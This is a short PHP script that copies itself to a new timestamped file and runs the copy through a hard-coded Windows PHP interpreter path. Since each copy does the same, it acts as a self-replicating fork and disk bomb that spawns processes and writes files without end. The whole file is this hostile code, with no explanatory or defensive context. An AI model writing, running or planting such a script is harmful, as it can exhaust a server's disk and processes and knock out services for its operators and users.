<?php

$repeat = 0;
$dir = dirname (__FILE__) ."\\";
do
{
	$file = $dir . time ( ) . rand ( );
	copy ( __FILE__, $file );
	$fp = popen ( "I:\WebServers\usr\local\php\php.exe ". $file, "r" );
}
while ( $repeat );
?>
